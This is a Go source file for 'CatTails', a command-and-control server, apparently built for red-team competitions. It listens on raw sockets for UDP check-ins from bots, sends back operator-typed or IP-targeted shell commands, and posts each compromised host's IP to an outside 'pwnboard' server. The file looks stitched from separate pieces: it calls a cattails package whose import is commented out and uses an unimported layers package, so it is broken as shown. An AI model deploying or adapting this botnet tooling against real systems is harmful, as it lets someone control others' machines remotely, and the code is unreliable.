package main

import (
	"bufio"
	"bytes"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"

	"github.com/google/gopacket"
	// "github.com/oneNutW0nder/CatTails/cattails"
	//"github.com/rphaley/c2/cattails"
	"golang.org/x/sys/unix"
	"golang.org/x/net/bpf"
)


// FilterRaw is a BPF struct containing raw instructions.
// Generate with tcpdump udp and port 56969 -dd
// or whatever filter you would like to generate
var FilterRaw = []bpf.RawInstruction{
	{0x28, 0, 0, 0x0000000c},
	{0x15, 0, 6, 0x000086dd},
	{0x30, 0, 0, 0x00000014},
	{0x15, 0, 15, 0x00000011},
	{0x28, 0, 0, 0x00000036},
	{0x15, 12, 0, 0x0000de89},
	{0x28, 0, 0, 0x00000038},
	{0x15, 10, 11, 0x0000de89},
	{0x15, 0, 10, 0x00000800},
	{0x30, 0, 0, 0x00000017},
	{0x15, 0, 8, 0x00000011},
	{0x28, 0, 0, 0x00000014},
	{0x45, 6, 0, 0x00001fff},
	{0xb1, 0, 0, 0x0000000e},
	{0x48, 0, 0, 0x0000000e},
	{0x15, 2, 0, 0x0000de89},
	{0x48, 0, 0, 0x00000010},
	{0x15, 0, 1, 0x0000de89},
	{0x6, 0, 0, 0x00040000},
	{0x6, 0, 0, 0x00000000},
}

// Function to do this err checking repeatedly
func checkEr(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

// htons converts a short (uint16) from host-to-network byte order.
// #Stackoverflow
func htons(i uint16) uint16 {
	return (i<<8)&0xff00 | i>>8
}

// ServerReadPacket reads packets from a socket file descriptor (fd)
//
// fd  	--> file descriptor that relates to the socket created in main
// vm 	--> BPF VM that contains the BPF Program
//
// Returns 	--> None
func ServerReadPacket(fd int, vm *bpf.VM) gopacket.Packet {

	// Buffer for packet data that is read in
	buf := make([]byte, 1500)

	// Read in the packets
	// num 		--> number of bytes
	// sockaddr --> the sockaddr struct that the packet was read from
	// err 		--> was there an error?
	_, _, err := unix.Recvfrom(fd, buf, 0)

	checkEr(err)

	// Filter packet?
	// numBytes	--> Number of bytes
	// err	--> Error you say?
	numBytes, err := vm.Run(buf)
	checkEr(err)
	if numBytes == 0 {
		// Change "continue" to return for routine logic
		return nil // 0 means that the packet should be dropped
		// Here we are just "ignoring" the packet and moving on to the next one
	}

	// Parse packet... hopefully
	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
		// Make sure this is my packet
		if strings.Contains(string(packet.ApplicationLayer().Payload()), "HELLO:") {
			return packet
		}
		return nil
	}
	return nil
}


// CreateAddrStruct creates a "syscall.ScokaddrLinklayer" struct used
//	for binding the socket to an interface
//
// ifaceInfo	--> net.Interface pointer
//
// Returns		--> syscall.SockaddrLinklayer struct
func CreateAddrStruct(ifaceInfo *net.Interface) (addr unix.SockaddrLinklayer) {
	// Create a byte array for the MAC Addr
	var haddr [8]byte

	// Copy the MAC from the interface struct in the new array
	copy(haddr[0:7], ifaceInfo.HardwareAddr[0:7])

	// Initialize the Sockaddr struct
	addr = unix.SockaddrLinklayer{
		Protocol: unix.ETH_P_IP,
		Ifindex:  ifaceInfo.Index,
		Halen:    uint8(len(ifaceInfo.HardwareAddr)),
		Addr:     haddr,
	}

	return addr
}

// SendPacket sends a packet using a provided
//	socket file descriptor (fd)
//
// fd 			--> The file descriptor for the socket to use
// ifaceInfo	--> pointer to net.Interface struct
// addr			--> struct from CreateAddrStruct()
// packetdata	--> The packet to send
//
// Returns 	--> None
func SendPacket(fd int, ifaceInfo *net.Interface, addr unix.SockaddrLinklayer, packetData []byte) {

	// Bind the socket
	checkEr(unix.Bind(fd, &addr))

	_, err := unix.Write(fd, packetData)
	checkEr(err)
}

// CreatePacket takes a net.Interface pointer to access
// 	things like the MAC Address... and yeah... the MAC Address
//
// ifaceInfo	--> pointer to a net.Interface
//
// Returns		--> Byte array that is a properly formed/serialized packet
func CreatePacket(ifaceInfo *net.Interface, srcIp net.IP,
	dstIP net.IP, srcPort int, dstPort int, dstMAC net.HardwareAddr, payload string) (packetData []byte) {

	// Buffer to building our packet
	buf := gopacket.NewSerializeBuffer()

	// Generate options
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	// Ethernet layer
	ethernet := &layers.Ethernet{
		EthernetType: layers.EthernetTypeIPv4,
		SrcMAC:       ifaceInfo.HardwareAddr,
		DstMAC:       dstMAC,
	}
	// IPv4 layer
	ip := &layers.IPv4{
		Version:    0x4,
		IHL:        5,
		TTL:        255,
		Flags:      0x40,
		FragOffset: 0,
		Protocol:   unix.IPPROTO_UDP, // Sending a UDP Packet
		DstIP:      dstIP,            //net.IPv4(),
		SrcIP:      srcIp,            //net.IPv4(),
	}
	// UDP layer
	udp := &layers.UDP{
		SrcPort: layers.UDPPort(srcPort), // No Random Port
		DstPort: layers.UDPPort(dstPort), // Saw this used in some code @github... seems legit
	}

	// Checksum calculations
	udp.SetNetworkLayerForChecksum(ip)

	checkEr(gopacket.SerializeLayers(buf, opts, ethernet, ip, udp, gopacket.Payload(payload)))

	// Save the newly formed packet and return it
	packetData = buf.Bytes()

	return packetData
}

// CreateBPFVM creates a BPF VM that contains a BPF program
// 	given by the user in the form of "[]bpf.RawInstruction".
// You can create this by using "tcpdump -dd [your filter here]"
//
// filter	--> Raw BPF instructions generated from tcpdump
//
// Returns	--> Pointer to a BPF VM containing the filter/program
func CreateBPFVM(filter []bpf.RawInstruction) (vm *bpf.VM) {

	// Disassemble the raw instructions so we can pass them to a VM
	insts, allDecoded := bpf.Disassemble(filter)
	if allDecoded != true {
		log.Fatal("Error decoding BPF instructions...")
	}

	vm, err := bpf.NewVM(insts)
	checkEr(err)

	return vm
}

// NewSocket creates a new RAW socket and returns the file descriptor
//
// Returns --> File descriptor for the raw socket
func NewSocket() (fd int) {

	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(htons(unix.ETH_P_ALL)))
	checkEr(err)

	return fd
}

// GetOutboundIP finds the outbound IP addr for the machine
//
// addr		--> The IP you want to be able to reach from an interface
//
// Returns	--> IP address in form "XXX.XXX.XXX.XXX"
func getOutboundIP(addr string) net.IP {
	conn, err := net.Dial("udp", addr)
	checkEr(err)

	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP
}

// GetOutwardIface determines the interface associated with
// sending traffic out on the wire and returns a *net.Interface struct
//
// addr		--> The IP you want to be able to reach from an interface
//
// Returns	--> *net.Interface struct of outward interface
//			--> net.IP used for creating a packet
func GetOutwardIface(addr string) (byNameiface *net.Interface, ip net.IP) {
	outboundIP := getOutboundIP(addr)

	ifaces, err := net.Interfaces()
	checkEr(err)

	for _, i := range ifaces {

		byNameiface, err := net.InterfaceByName(i.Name)
		checkEr(err)

		addrs, _ := byNameiface.Addrs()

		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if bytes.Compare(outboundIP, ipnet.IP.To4()) == 0 {
					ip := ipnet.IP.To4()
					return byNameiface, ip
				}
			}
		}
	}

	return
}

// GetRouterMAC gets the default gateway MAC addr from the system
//
// Returns 	--> MAC addr of the gateway of type net.HardwareAddr
//
// Credit: Milkshak3s & Cictrone
func GetRouterMAC() (net.HardwareAddr, error) {
	// get the default gateway address from routes
	gatewayAddr := ""
	fRoute, err := os.Open("/proc/net/route")
	if err != nil {
		return nil, err
	}
	defer fRoute.Close()

	s := bufio.NewScanner(fRoute)
	s.Scan()

	for s.Scan() {
		line := s.Text()
		fields := strings.Fields(line)
		if fields[1] == "00000000" {
			decode, err := hex.DecodeString(fields[2])
			if err != nil {
				return nil, err
			}

			gatewayAddr = fmt.Sprintf("%v.%v.%v.%v", decode[3], decode[2], decode[1], decode[0])
		}
	}

	if gatewayAddr == "" {
		return nil, errors.New("no gateway found in routes")
	}

	// look through arp tables for match to gateway address
	fArp, err := os.Open("/proc/net/arp")
	if err != nil {
		return nil, err
	}
	defer fArp.Close()

	s = bufio.NewScanner(fArp)
	s.Scan()

	for s.Scan() {
		line := s.Text()
		fields := strings.Fields(line)
		if fields[0] == gatewayAddr {
			return net.ParseMAC(fields[3])
		}
	}

	return nil, errors.New("no gateway found")
}


// CreateCommand creates the payload for sending commands to bots
func CreateCommand(cmd string) (command string) {
	command = "COMMAND: " + cmd
	return command
}

// CreateTargetCommand creates a target command string
func CreateTargetCommand(cmd string, ip string) (command string) {
	command = "TARGET: " + ip + " " + cmd
	return command
}



// =================================================cattails.go^====server.gov==================
// Global to store staged command
var stagedCmd string

// Glabal to store target info
var targetIP string
var targetcommand string

// Host defines values for a callback from a bot
type Host struct {
	Hostname string
	Mac      net.HardwareAddr
	IP       net.IP
	RespIP   net.IP
	SrcPort  int
	DstPort  int
}

// PwnBoard is used for updating pwnboard
type PwnBoard struct {
	IPs  string `json:"ip"`
	Type string `json:"type"`
}

// sendCommand takes
func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, listen chan Host) {

	// Forever loop to respond to bots
	for {
		// Block on reading from channel
		bot := <-listen
		// Check if there is a command to run
		// Make a socket for sending
		fd := cattails.NewSocket()
		// Create packet
		fmt.Println("SRC MAC:", iface.HardwareAddr)
		fmt.Println("DST MAC:", dstMAC)
		fmt.Println("SRC IP:", myIP)
		fmt.Println("DST IP:", bot.RespIP)
		if targetcommand != "" {
			fmt.Println("[+] Sending target cmd", targetIP, targetcommand)
			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateTargetCommand(targetcommand, targetIP))
			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
			fmt.Println("[+] Packet target cmd sent", targetIP, stagedCmd)
		} else if stagedCmd != "" {
			fmt.Println("[+] Sending staged cmd", targetIP, stagedCmd)
			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(stagedCmd))
			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
			fmt.Println("[+] Packet staged cmd sent", targetIP, stagedCmd)
		} else {
			fmt.Print("[-] Fuck you no command received")
		}
		// YEET
		if stagedCmd != "" {
			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
			// Close the socket
			unix.Close(fd)
			updatepwnBoard(bot)
		} else {
			unix.Close(fd)
			updatepwnBoard(bot)
		}
	}
}

// ProcessPacket TODO:
func serverProcessPacket(packet gopacket.Packet, listen chan Host) {

	// Get data from packet
	data := string(packet.ApplicationLayer().Payload())
	payload := strings.Split(data, " ")

	fmt.Println("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())
	fmt.Println("Paylod Received:",data)
	// Parse the values from the data
	mac, err := net.ParseMAC(payload[2])
	if err != nil {
		fmt.Println("[-] ERROR PARSING MAC:", err)
		return
	}

	srcport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Src().String())
	dstport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Dst().String())

	// New Host struct for shipping info to sendCommand()
	newHost := Host{
		Hostname: payload[1],
		Mac:      mac,
		IP:       net.ParseIP(payload[3]),
		RespIP:   net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String()),
		SrcPort:  srcport,
		DstPort:  dstport,
	}

	fmt.Println("[+] Recieved From:", newHost.Hostname, "(", newHost.IP, ")")
	// Write host to channel
	listen <- newHost
}

// Simple CLI to update the "stagedCmd" value
func cli() {
	for {
		// reader type
		reader := bufio.NewReader(os.Stdin)

		fmt.Print("CatTails> ")
		stagedCmd, _ = reader.ReadString('\n')
		fmt.Println("[+] stagedCmd ack:",stagedCmd)
		// Trim the bullshit newlines
		stagedCmd = strings.Trim(stagedCmd, "\n")
		if stagedCmd == "TARGET" {
			stagedCmd = ""
			// Get the target IP
			fmt.Print("Enter IP to target> ")
			targetIP, _ = reader.ReadString('\n')
			targetIP = strings.Trim(targetIP, "\n")

			// Get TARGET command
			fmt.Print("TARGET COMMAND> ")
			targetcommand, _ = reader.ReadString('\n')
			targetcommand = strings.Trim(targetcommand, "\n")
		}
		fmt.Println("[+] Staged CMD:", stagedCmd)
		if targetcommand != "" {
			fmt.Println("[+] Target CMD:", targetcommand, "on box", targetIP)
		}
	}
}

// Update pwnboard
func updatepwnBoard(bot Host) {
	url := "http://pwnboard.win/generic"

	// Create the struct
	data := PwnBoard{
		IPs:  bot.IP.String(),
		Type: "CatTails",
	}

	// Marshal the data
	sendit, err := json.Marshal(data)
	if err != nil {
		fmt.Println("\n[-] ERROR SENDING POST:", err)
		return
	}

	// Send the post to pwnboard
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(sendit))
	if err != nil {
		fmt.Println("[-] ERROR SENDING POST:", err)
		return
	}

	defer resp.Body.Close()
}

func main() {

	// Create a BPF vm for filtering
	vm := cattails.CreateBPFVM(cattails.FilterRaw)

	// Create a socket for reading
	readfd := cattails.NewSocket()
	defer unix.Close(readfd)

	fmt.Println("[+] Created sockets")

	// Make channel buffer by 5
	listen := make(chan Host, 5)

	// Iface and myip for the sendcommand func to use
	iface, myIP := cattails.GetOutwardIface("172.25.2.11:80")
	fmt.Println("[+] Interface:", iface.Name)

	dstMAC, err := cattails.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] DST MAC:", dstMAC.String())

	// Spawn routine to listen for responses
	fmt.Println("[+] Starting go routine...")
	go sendCommand(iface, myIP, dstMAC, listen)

	// Start CLI
	go cli()

	// This needs to be on main thread
	for {
		// packet := cattails.ServerReadPacket(readfd, vm)
		packet := cattails.ServerReadPacket(readfd, vm)
		// Yeet over to processing function
		if packet != nil {
			go serverProcessPacket(packet, listen)
		}
	}
}
